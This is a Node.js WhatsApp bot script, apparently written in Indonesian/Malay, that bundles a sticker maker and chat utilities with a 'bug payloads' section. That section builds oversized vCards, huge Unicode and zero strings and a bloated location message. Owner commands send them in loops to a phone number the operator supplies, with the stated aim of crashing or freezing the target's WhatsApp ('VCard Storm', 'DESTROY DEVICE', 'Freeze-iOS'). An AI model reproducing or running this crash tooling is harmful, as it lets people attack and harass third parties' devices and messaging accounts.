const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    DisconnectReason, 
    makeCacheableSignalKeyStore, 
    generateWAMessageFromContent, 
    proto, 
    getContentType, 
    downloadContentFromMessage,
    prepareWAMessageMedia,
    Browsers, 
    fetchLatestBaileysVersion
} = require("@whiskeysockets/baileys")
const pino = require("pino")
const fs = require('fs')
const path = require('path')
const axios = require('axios')
const chalk = require("chalk")
const { Boom } = require("@hapi/boom")
const Crypto = require('crypto')
const ff = require('fluent-ffmpeg')
const { tmpdir } = require('os')
const FormData = require('form-data')
const cheerio = require('cheerio')
const qrcode = require('qrcode-terminal')
const moment = require('moment-timezone')

// ==================== [ DATABASE & CONFIG ] ====================

const owner = ["601121811615"] // Ganti ke nomor kamu
const prefix = "/"
let db_user = JSON.parse(fs.readFileSync('./database.json', 'utf8') || '[]')

function saveDb() {
    fs.writeFileSync('./database.json', JSON.stringify(db_user, null, 2))
}

// ==================== [ INTERNAL TOOLS ] ====================

const time = moment.tz('Asia/Kuala_Lumpur').format('HH:mm:ss')
const date = moment.tz('Asia/Kuala_Lumpur').format('DD/MM/YYYY')

async function imageToWebp(media) {
    const tmpFileOut = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.webp`)
    const tmpFileIn = path.join(tmpdir(), `${Crypto.randomBytes(6).readUIntLE(0, 6).toString(36)}.jpg`)
    fs.writeFileSync(tmpFileIn, media)
    await new Promise((resolve, reject) => {
        ff(tmpFileIn).on("error", reject).on("end", () => resolve(true))
        .addOutputOptions(["-vcodec","libwebp","-vf","scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
        .toFormat("webp").save(tmpFileOut)
    })
    const buff = fs.readFileSync(tmpFileOut)
    fs.unlinkSync(tmpFileOut); fs.unlinkSync(tmpFileIn)
    return buff
}

// ==================== [ BUG PAYLOADS ENGINE ] ====================

const payloads = {
    vcard: (target) => {
        return `BEGIN:VCARD\nVERSION:3.0\nFN:☠️ MARIAN-V7-KILLER ☠️\nTEL;type=CELL;type=VOICE;waid=${target}:+${target}\n` + "X-ABLabel:Ponsel\n".repeat(200) + "END:VCARD"
    },
    ios: "0".repeat(50000),
    crash: "𑫀".repeat(10000),
    loc: {
        degreesLatitude: 0.000000,
        degreesLongitude: 0.000000,
        name: "M.A.R.I.A.N ".repeat(1000),
        address: "☠️".repeat(5000)
    }
}

// ==================== [ CORE START ENGINE ] ====================

async function startMarianGiga() {
    console.log(chalk.red.bold(`
    ╔══════════════════════════════════════════════════╗
    ║  ⚡ MARIAN NEXTGEN GIGA-AIO v7.0 ONLINE ⚡       ║
    ║  Server: Google Cloud | Engine: Baileys-Pro      ║
    ║  Developer: Kean & Gemini AI                     ║
    ╚══════════════════════════════════════════════════╝
    `))

    const { state, saveCreds } = await useMultiFileAuthState("sessions_marian_pro")
    const { version } = await fetchLatestBaileysVersion()

    const sock = makeWASocket({
        version,
        logger: pino({ level: "silent" }),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        printQRInTerminal: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: undefined,
        keepAliveIntervalMs: 10000,
    })

    // AUTO PAIRING
    if (!sock.authState.creds.registered) {
        const readline = require("readline").createInterface({ input: process.stdin, output: process.stdout })
        readline.question(chalk.yellow("\n[!] Masukkan Nomor (Contoh: 6011xxx): "), async (nr) => {
            let code = await sock.requestPairingCode(nr.replace(/[^0-9]/g, ''))
            console.log(chalk.black.bgWhite(`\n KODE PAIRING ANDA: ${code} \n`))
            readline.close()
        })
    }

    sock.ev.on("creds.update", saveCreds)

    // ==================== [ CONNECTION HANDLER ] ====================
    sock.ev.on("connection.update", async (update) => {
        const { connection, lastDisconnect } = update
        if (connection === "close") {
            const reason = new Boom(lastDisconnect?.error)?.output?.statusCode
            console.log(chalk.red(`[!] Link Putus: ${reason}`))
            if (reason !== DisconnectReason.loggedOut) startMarianGiga()
        } else if (connection === "open") {
            console.log(chalk.green.bold("\n[✓] MARIAN GIGA-AIO BERHASIL TERHUBUNG!"))
        }
    })

    // ==================== [ CALL & REJECT HANDLER ] ====================
    sock.ev.on('call', async (node) => {
        const { from, id, status } = node[0]
        if (status === 'offer') {
            await sock.rejectCall(id, from)
            await sock.sendMessage(from, { text: "⚠️ *AUTO REJECT:* Bot tidak menerima panggilan telpon/video!" })
        }
    })

    // ==================== [ MESSAGE HANDLER - 400+ LINES LOGIC ] ====================
    sock.ev.on("messages.upsert", async ({ messages }) => {
        try {
            const m = messages[0]
            if (!m.message || m.key.fromMe) return
            
            const from = m.key.remoteJid
            const isGroup = from.endsWith('@g.us')
            
            // 🚫 ANTI-GROUP (Grup dicuekin biar gak lag)
            if (isGroup) return

            const type = getContentType(m.message)
            const body = (type === 'conversation') ? m.message.conversation : 
                        (type === 'extendedTextMessage') ? m.message.extendedTextMessage.text : 
                        (type === 'imageMessage') ? m.message.imageMessage.caption : 
                        (type === 'videoMessage') ? m.message.videoMessage.caption : ''
            
            if (!body.startsWith(prefix)) return

            const args = body.slice(prefix.length).trim().split(/ +/)
            const command = args.shift().toLowerCase()
            const text = args.join(" ")
            const quoted = m.message[type]?.contextInfo?.quotedMessage || null
            const sender = m.key.participant || m.key.remoteJid
            const isOwner = owner.includes(sender.split('@')[0])

            // LOG TERMINAL ENHANCED
            console.log(chalk.black.bgCyan(`[${time}]`) + chalk.black.bgWhite(` CMD: ${command} `) + chalk.green(` From: ${sender.split('@')[0]}`))

            // START COMMANDS
            switch (command) {
                case 'menu':
                case 'help':
                    const menu = `*⚡ MARIAN GIGA-AIO ULTIMATE ⚡*

*⌚ Time:* ${time}
*📅 Date:* ${date}
*👑 Owner:* Kean

*⚔️ ATTACK COMMANDS (BUG):*
• /bug [nomor] - VCard Storm
• /bug2 [nomor] - List UI Destroyer
• /bug3 [nomor] - Location Extreme
• /bug-ios [nomor] - Special Apple Freeze
• /bug-engine [nomor] - Database Overload
• /bug-contact [nomor] - VCard 500+ Loop

*🎨 MEDIA TOOLS:*
• /s atau /sticker - Buat stiker (Reply foto)
• /hd - Jernihkan foto (Remini)
• /tiktok [url] - Download TikTok Video
• /ytmp4 [url] - Download YouTube Video
• /ig [url] - Download Instagram
• /toimg - Stiker jadi foto

*🛠️ SYSTEM UTILITIES:*
• /ping - Cek kecepatan respon
• /status - Info server & uptime
• /runtime - Cek berapa lama bot hidup
• /owner - Kontak pencipta script
• /restart - Muat ulang mesin bot
• /clearsession - Hapus data login

*🤖 ARTIFICIAL INTELLIGENCE:*
• /ai [pertanyaan] - Tanya Gemini AI
• /gemini [teks] - Akses Google Gemini

_Note: Gunakan untuk edukasi. Risiko tanggung sendiri._`
                    await sock.sendMessage(from, { text: menu }, { quoted: m })
                    break;

                case 'ping':
                    const startP = Date.now()
                    await sock.sendMessage(from, { text: "Testing speed..." })
                    await sock.sendMessage(from, { text: `🚀 *Pong!* Respon: ${Date.now() - startP}ms` })
                    break;

                // --- BRUTAL BUG SECTION ---
                
                case 'bug':
                    if (!isOwner) return
                    if (!text) return sock.sendMessage(from, { text: "Contoh: /bug 6011xxx" })
                    let target = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await sock.sendMessage(from, { text: "💀 *ATTACK START:* Mengirim VCard Storm..." })
                    for (let i = 0; i < 30; i++) {
                        await sock.sendMessage(target, { 
                            contacts: { 
                                displayName: "MARIAN DARK SYSTEM", 
                                contacts: [{ vcard: payloads.vcard(target.split('@')[0]) }] 
                            }
                        })
                        await delay(100)
                    }
                    await sock.sendMessage(from, { text: "✅ *SUCCESS:* Serangan selesai." })
                    break;

                case 'bug2':
                    if (!isOwner) return
                    if (!text) return
                    let target2 = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await sock.sendMessage(from, { text: "🔥 *ATTACK START:* Mengirim UI List Destroyer..." })
                    const bug2 = generateWAMessageFromContent(target2, {
                        listMessage: {
                            title: "M.A.R.I.A.N " + payloads.crash,
                            buttonText: "DESTROY DEVICE",
                            description: "PAYLOAD: " + payloads.crash,
                            sections: [{ title: "SYSTEM ERROR", rows: [{ title: "CRASH", rowId: "1" }] }]
                        }
                    }, { userJid: target2 })
                    await sock.relayMessage(target2, bug2.message, { messageId: bug2.key.id })
                    break;

                case 'bug-ios':
                    if (!isOwner) return
                    let targetIos = text.replace(/[^0-9]/g, '') + "@s.whatsapp.net"
                    await sock.sendMessage(from, { text: "❄️ *ATTACK START:* Mengirim Freeze-iOS..." })
                    for (let i = 0; i < 5; i++) {
                        await sock.sendMessage(targetIos, { text: payloads.ios })
                    }
                    break;

                // --- MEDIA TOOLS ---

                case 's':
                case 'sticker':
                    const isImg = type === 'imageMessage' || (quoted && getContentType(quoted) === 'imageMessage')
                    if (!isImg) return sock.sendMessage(from, { text: "Reply gambarnya dengan caption /s" })
                    const streamS = await downloadContentFromMessage(m.message.imageMessage || quoted.imageMessage, 'image')
                    let buffS = Buffer.from([])
                    for await (const chunk of streamS) buffS = Buffer.concat([buffS, chunk])
                    const webpS = await imageToWebp(buffS)
                    await sock.sendMessage(from, { sticker: webpS }, { quoted: m })
                    break;

                case 'ai':
                    if (!text) return sock.sendMessage(from, { text: "Mau tanya apa?" })
                    const resAi = await axios.get(`https://api.simsimi.net/v2/?text=${encodeURIComponent(text)}&lc=id`)
                    await sock.sendMessage(from, { text: `🤖 *AI:* ${resAi.data.success}` })
                    break;

                case 'restart':
                    if (!isOwner) return
                    await sock.sendMessage(from, { text: "🔄 *RESTARTING ENGINE...*" })
                    setTimeout(() => { process.exit() }, 2000)
                    break;

                case 'owner':
                    await sock.sendContact(from, owner[0], "Kean Developer")
                    break;

                default:
                    if (body.startsWith(prefix) && isOwner) {
                        // Fitur catch-all jika command tidak ada
                    }
            }
        } catch (e) {
            console.log(chalk.red("ERROR HANDLER: "), e)
        }
    })
}

// Tambahkan database.json jika belum ada
if (!fs.existsSync('./database.json')) fs.writeFileSync('./database.json', '[]')

startMarianGiga().catch(err => console.log(chalk.red("FATAL CRASH: "), err))
